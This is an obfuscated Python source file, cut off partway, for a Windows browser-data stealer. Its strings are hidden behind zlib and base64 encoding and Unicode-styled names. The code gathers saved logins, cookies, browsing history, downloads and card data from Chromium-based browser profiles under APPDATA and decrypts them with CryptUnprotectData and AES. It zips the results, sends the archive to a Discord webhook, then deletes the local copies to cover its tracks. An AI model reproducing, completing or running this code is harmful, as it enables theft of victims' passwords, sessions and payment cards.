import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
__𝘓𝗢𝗚𝙄𝘕𝗦__ = []
__𝗖𝘖𝗢𝙆𝗜𝘌𝗦__ = []
__𝘞𝘌𝗕_𝙃𝗜𝙎𝗧𝗢𝘙𝘠__ = []
__𝗗𝙊𝘞𝘕𝗟𝙊𝘈𝗗𝗦__ = []
__𝘾𝘈𝙍𝘋𝘚__ = []

class Browsers:

    def __init__(self, webhook):
        𝘀𝘦𝙩𝙖𝘁𝘁𝙧(𝙨𝘦𝗹𝘧, 'webhook', 𝗦𝘆𝙣𝗰𝗪𝙚𝘣𝘩𝙤𝗼𝘬.from_url(𝘄𝘦𝗯𝗵𝘰𝗼𝗸))
        𝘾𝙝𝗿𝗼𝙢𝗶𝘂𝙢()
        𝗢𝘱𝘦𝙧𝘢()
        𝙐𝘱𝗹𝙤𝗮𝘥(𝙨𝘦𝙡𝗳.webhook)

class Upload:

    def __init__(self, webhook):
        𝘀𝗲𝘵𝙖𝘁𝘁𝘳(𝘀𝗲𝙡𝙛, 'webhook', 𝘸𝘦𝘣𝗵𝘰𝙤𝗸)
        𝙨𝘦𝗹𝘧.write_files()
        𝘴𝙚𝙡𝘧.send()
        𝘴𝗲𝗹𝗳.clean()

    def write_files(self):
        𝘰𝘴.makedirs(__𝗶𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode(), exist_ok=True)
        if __𝘓𝙊𝗚𝘐𝙉𝘚__:
            with 𝘰𝗽𝗲𝙣(__𝘪𝗺𝗽𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JNr\xb7\xccK\x0c7\xad\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00c\xa1\x07\xbe')).decode(), __𝙞𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝗳:
                𝗳.write(__𝙞𝗺𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘀𝙩𝗿(𝘅) for 𝙭 in __𝘓𝗢𝘎𝘐𝗡𝙎__)))
        if __𝘊𝘖𝘖𝙆𝗜𝘌𝘚__:
            with 𝗼𝗽𝙚𝘯(__𝘪𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8e4\xb2,K4\xca\xc9I\xae45H\xf5\x08\xb4\x05\x00b\xd3\x07\xc9')).decode(), __𝗶𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝗶𝗺𝘱𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                𝙛.write(__𝙞𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘴𝘵𝗿(𝙭) for 𝘅 in __𝗖𝗢𝗢𝘒𝙄𝗘𝙎__)))
        if __𝗪𝘌𝗕_𝘏𝙄𝙎𝘛𝗢𝗥𝗬__:
            with 𝘰𝗽𝙚𝗻(__𝙞𝙢𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JN1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcb.M\xf1\xc80\x00\x00\x8a\x18\t\xb2')).decode(), __𝙞𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝙞𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
                𝗳.write(__𝙞𝙢𝗽𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘀𝘵𝙧(𝘹) for 𝘹 in __𝙒𝘌𝘉_𝘏𝗜𝘚𝘛𝘖𝘙𝗬__)))
        if __𝘿𝘖𝗪𝘕𝙇𝙊𝘼𝘋𝗦__:
            with 𝘰𝘱𝙚𝗻(__𝗶𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8er\xb74N\xca\xad(\x8b\x0c\x0f\xaa\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00\x88\xc9\tM')).decode(), __𝘪𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
                𝗳.write(__𝙞𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝙨𝙩𝙧(𝘹) for 𝘅 in __𝗗𝗢𝙒𝘕𝙇𝙊𝘼𝘿𝙎__)))
        if __𝗖𝘼𝘙𝗗𝗦__:
            with 𝗼𝙥𝘦𝘯(__𝘪𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8e4r\xab\x8c\xf2\xf0-M\xf1\xc80\x00\x00E\x99\x06\x9a')).decode(), __𝗶𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
                𝘧.write(__𝗶𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝙨𝘁𝙧(𝘹) for 𝙭 in __𝘊𝗔𝗥𝘋𝘚__)))
        with 𝙕𝙞𝘱𝘍𝗶𝘭𝗲(__𝘪𝗺𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode(), __𝗶𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝙯𝘪𝗽:
            for 𝘧𝗶𝗹𝘦 in 𝙤𝘀.listdir(__𝘪𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode()):
                𝘻𝗶𝗽.write(__𝗶𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JN56\xb0\x05\x00\x19\x8d\x03\xad')).decode().format(𝙛𝗶𝗹𝙚), 𝙛𝘪𝘭𝙚)

    def send(self):
        𝘴𝙚𝘭𝘧.webhook.send(embed=𝙀𝘮𝙗𝗲𝘥(title=__𝙞𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x0b\xcbu3L\xf2\x08\xb4\x05\x00\x0b\x8b\x02s')).decode(), description=__𝘪𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8btwJ\x07\x00\x03(\x01J')).decode() + __𝙞𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join(𝘴𝘦𝙡𝙛.tree(𝗣𝘢𝘁𝗵(__𝘪𝘮𝙥𝗼𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode()))) + __𝙞𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8btwJ\x07\x00\x03(\x01J')).decode()), file=𝙁𝘪𝙡𝙚(__𝙞𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode()))

    def clean(self):
        𝙨𝘩𝙪𝙩𝗶𝗹.rmtree(__𝗶𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode())
        𝗼𝘀.remove(__𝙞𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode())

    def tree(self, path, prefix=__𝙞𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), midfix_folder=__𝘪𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xb3\xf0\xd2\x0eI\xcft,\xf1t\xb4\xb5\x05\x00\x16\xfb\x03\x8b')).decode(), midfix_file=__𝗶𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xb3\xf0\xd2\x0e\xc9pv,\xf1t\xb4\xb5\x05\x00\x15\xf9\x03f')).decode()):
        𝙥𝗶𝙥𝙚𝘴 = {__𝘪𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK6v\xca\x884\n\xb5\x05\x00\n\xfa\x02^')).decode(): __𝙞𝙢𝗽𝙤𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3tvL\xf7t\xb4\xb5\x05\x00\nL\x029')).decode(), __𝙞𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xca\xf5\xcb\x07\x00\rp\x03\x06')).decode(): __𝘪𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda3)\x08v\xf6tvL\x07\x00\n\xcf\x02o')).decode(), __𝘪𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode(): __𝗶𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda3)\x08N6)\x08v\x04aOG[[\x00*\xbd\x04\xcf')).decode(), __𝗶𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKrw\xabJq\xb4\xb5\x05\x00\x0c\x19\x02\x89')).decode(): __𝗶𝘮𝘱𝗼𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda3)\x08\x0e5)\x08v\x04aOG[[\x00*\x07\x04\xc1')).decode()}
        if 𝗽𝘳𝗲𝘧𝗶𝘹 == __𝙞𝙢𝙥𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            yield (𝘮𝗶𝗱𝘧𝘪𝙭_𝘧𝙤𝗹𝗱𝘦𝙧 + 𝘱𝙖𝘵𝙝.name)
        𝗰𝗼𝘯𝘁𝘦𝗻𝘁𝘴 = 𝘭𝙞𝘴𝙩(𝘱𝙖𝙩𝙝.iterdir())
        𝗽𝙤𝙞𝙣𝙩𝘦𝘳𝘀 = [𝗽𝘪𝙥𝙚𝘀[__𝗶𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode()]] * (𝗹𝙚𝘯(𝗰𝙤𝙣𝘁𝙚𝘯𝘁𝘴) - 𝗶𝗻𝘁.from_bytes(𝗺𝗮𝘱(lambda O, i: 375 - (𝗶𝗻𝘵(𝘖) + 𝘪), 𝗺𝗮𝘱(__𝘪𝗺𝘱𝙤𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝘪𝙩𝙚𝘳(__𝙞𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xadJ6\x00\x00\x03\x9c\x01[')).decode())] * 3)), 𝘳𝙖𝘯𝘨𝘦(1)), __𝘪𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + [𝘱𝗶𝙥𝙚𝙨[__𝘪𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKrw\xabJq\xb4\xb5\x05\x00\x0c\x19\x02\x89')).decode()]]
        for (𝙥𝗼𝙞𝗻𝘵𝙚𝗿, 𝘱𝗮𝘵𝘩) in 𝙯𝙞𝗽(𝗽𝘰𝘪𝘯𝙩𝘦𝘳𝘴, 𝙘𝗼𝘯𝙩𝘦𝘯𝙩𝘀):
            if 𝘱𝙖𝙩𝘩.is_dir():
                yield __𝙞𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK564O\x8b(\xb1L56H\xf7\xf6(\xb1\xf4t\x8f*Hr\x0f\xab\xf2qv2\xf7\xcf4\xa9\x8c\xca3HO4\xf2,\x00\x00\x008\x0c\xc6')).decode().format(𝙥𝘳𝙚𝙛𝙞𝙭, 𝘱𝙤𝙞𝗻𝘵𝘦𝙧, 𝘮𝘪𝘥𝙛𝗶𝘅_𝘧𝗼𝗹𝘥𝗲𝗿, 𝘱𝘢𝘵𝙝.name, 𝗹𝗲𝗻(𝘭𝘪𝘴𝘵(𝗽𝙖𝘁𝙝.glob(__𝗶𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xce\xcc/\xf3N\xb7\xb5\x05\x00\r?\x02\xc6')).decode()))), 𝘴𝘶𝙢((𝘧.stat().st_size for 𝗳 in 𝗽𝘢𝘁𝗵.glob(__𝙞𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xce\xcc/\xf3N\xb7\xb5\x05\x00\r?\x02\xc6')).decode()) if 𝘧.is_file())) / 𝗶𝙣𝘁.from_bytes(𝘮𝘢𝙥(lambda O, i: 492 - (𝙞𝙣𝘵(𝘖) + 𝗶), 𝙢𝘢𝘱(__𝘪𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝙞𝙩𝙚𝘳(__𝗶𝙢𝙥𝙤𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3s\xc9\xae\xf4sI7\x06\x00\x0c8\x02\xa3')).decode())] * 3)), 𝘳𝘢𝗻𝗴𝘦(2)), __𝘪𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
                𝗲𝘹𝘁𝗲𝗻𝘀𝙞𝘰𝙣 = 𝙥𝙞𝗽𝗲𝘴[__𝗶𝘮𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xca\xf5\xcb\x07\x00\rp\x03\x06')).decode()] if 𝗽𝗼𝙞𝙣𝙩𝘦𝗿 == 𝗽𝙞𝗽𝙚𝙨[__𝗶𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode()] else 𝗽𝗶𝘱𝙚𝘴[__𝗶𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK6v\xca\x884\n\xb5\x05\x00\n\xfa\x02^')).decode()]
                yield from 𝘴𝘦𝘭𝘧.tree(𝙥𝙖𝘵𝗵, prefix=𝘱𝙧𝙚𝗳𝗶𝘹 + 𝗲𝘹𝙩𝙚𝗻𝘀𝘪𝗼𝘯)
            else:
                yield __𝗶𝘮𝘱𝗼𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK564O\x8b(\xb1L56H\xf7\xf6(6\xf3\xc9\xf2\xcaM\x0bv*\x8a\xcc\xcc\xb6\x05\x00~\x97\t\x1b')).decode().format(𝗽𝘳𝘦𝙛𝙞𝘹, 𝘱𝙤𝗶𝘯𝙩𝘦𝘳, 𝘮𝙞𝘥𝙛𝙞𝙭_𝗳𝘪𝗹𝘦, 𝘱𝘢𝙩𝗵.name, 𝗽𝙖𝘵𝗵.stat().st_size / 𝗶𝘯𝘵.from_bytes(𝗺𝗮𝘱(lambda O, i: 862 - (𝘪𝙣𝘁(𝘖) + 𝙞), 𝙢𝙖𝙥(__𝗶𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝘪𝘵𝙚𝗿(__𝘪𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3w\x89\xac\xf4w\t5\x06\x00\x0b\xb4\x02\x81')).decode())] * 3)), 𝙧𝘢𝙣𝗴𝘦(2)), __𝙞𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))

class Chromium:

    def __init__(self):
        𝘀𝙚𝙩𝙖𝙩𝙩𝗿(𝘀𝘦𝙡𝘧, 'appdata', 𝙤𝘀.getenv(__𝙞𝘮𝗽𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0bq\xb5t\t\x0c\xadp\nusr\r\x0c\x0br\x02\x00)\x05\x04\xd4')).decode()))
        𝙨𝗲𝘵𝗮𝘵𝘵𝙧(𝘴𝙚𝗹𝙛, 'browsers', {__𝘪𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8b\x0c7,\x882\xb2\xb0\x05\x00\x0b2\x02S')).decode(): 𝙨𝙚𝘭𝗳.appdata + __𝘪𝙢𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8bpu+I\x0cO)\x8bp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00h\x16\x07\xed')).decode(), __𝘪𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKq\xb7\xac\x8c4J\xb7\x05\x00\x0b\xd1\x02\x8d')).decode(): 𝙨𝘦𝗹𝗳.appdata + __𝙞𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\x0b*K\xce\xf5\xcb\x8fp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00i&\x07\xf7')).decode(), __𝗶𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK4\xb2,\x89\x8a\x08\xca\x00\x00\x0b\x84\x02\xad')).decode(): 𝘴𝙚𝘭𝘧.appdata + __𝙞𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x8bp-)K\n\x0f3\x88\x0c\xab\x08K6\n\xab\xf4t\r\xcaHqw\xb5\x05\x00h\xc4\x08\x1d')).decode(), __𝙞𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK2\xf6\xcaL\x8c\x082L\n\xb4\xb5\x05\x00\x18\xed\x03\xb2')).decode(): 𝙨𝙚𝗹𝗳.appdata + __𝗶𝙢𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b"x\xda\x8bp\xb5\xac\x8c\xcc\xcd1H\t7L\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00e;\x08'")).decode(), __𝙞𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8b4\n+Mq6\xccL\xce\xb54N6\n\xab\x04\x00,\x0e\x058')).decode(): 𝘴𝗲𝙡𝙛.appdata + __𝘪𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xf5\xcbI\xca\x0brN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xb0\xd7\n`')).decode(), __𝘪𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf33\xf63\x88\x8c\xf0\xb4\x05\x00\t\xdc\x027')).decode(): 𝘀𝘦𝙡𝙛.appdata + __𝘪𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8bpI\tIqw\xab\x8c\x80\xd1naUQ\x11\x9e\xe9A\xeen\x06\x91\x81\xb6\xb6\x00\xb2\xf0\n\x80')).decode(), __𝘪𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xdaK6v2Lq7-H,\xb7\xb5\x05\x00\x17M\x03\xac')).decode(): 𝘴𝙚𝘭𝙛.appdata + __𝗶𝙢𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\xf3+O\x89\x08*M\x0c/I\x0e5v2Lq7-H4\xac\x08K6\n\xab\xf4t\r\xcaHqw\xb5\x05\x00\xe3\x16\x0b\xfa')).decode(), __𝗶𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9\xcd1\x8a\x0c\xaf\xc8N\x0c\xb4\xb5\x05\x00\x1c\xa3\x04/')).decode(): 𝙨𝘦𝘭𝗳.appdata + __𝘪𝙢𝗽𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\x8b*H\xc9u+\x8er\xcfI\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00k\xb8\x08\x89')).decode(), __𝘪𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8b2\xb2,\x8b2\xaa\xc8\xf1\t\xf7\xcbO\xce\xb5,\x89\n6\xacJ\xf5\xf0\xb5\x05\x00e5\x08\x18')).decode(): 𝘴𝗲𝘭𝘧.appdata + __𝙞𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bpM)K2J)\x8e\n\xabpI\xf4\xf0*K\n\x0fM\x0f5\xce\x08\x89p\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\x1e\xf4\rt')).decode(), __𝙞𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x8b2\xb2,\x8b2\xaa\xc8\xf1\t\xf7\xcbO\xce\xb5,\x89\n\xb4\xb5\x05\x00FC\x06\xae')).decode(): 𝘴𝘦𝙡𝗳.appdata + __𝙞𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8bpM)K2J)\x8e\n\xabpI\xf4\xf0*K\n\x0fK\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00\xbb\xe6\x0bP')).decode(), __𝘪𝗺𝗽𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8b\x8ap*\x88\xac4,O\xce\xcd1\x8a\x0c\xf73\xf5\t\xf7\xaaL2N\xa9\x8a\x8a\xf0\xb4\x05\x00\x8dK\t\x91')).decode(): 𝙨𝗲𝗹𝗳.appdata + __𝘪𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\r+O\x0c\xf7M\x0f\xf5\xf0*H\xc9u\xcbJ\rvrN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00R\xa7\x0e\x8f')).decode(), 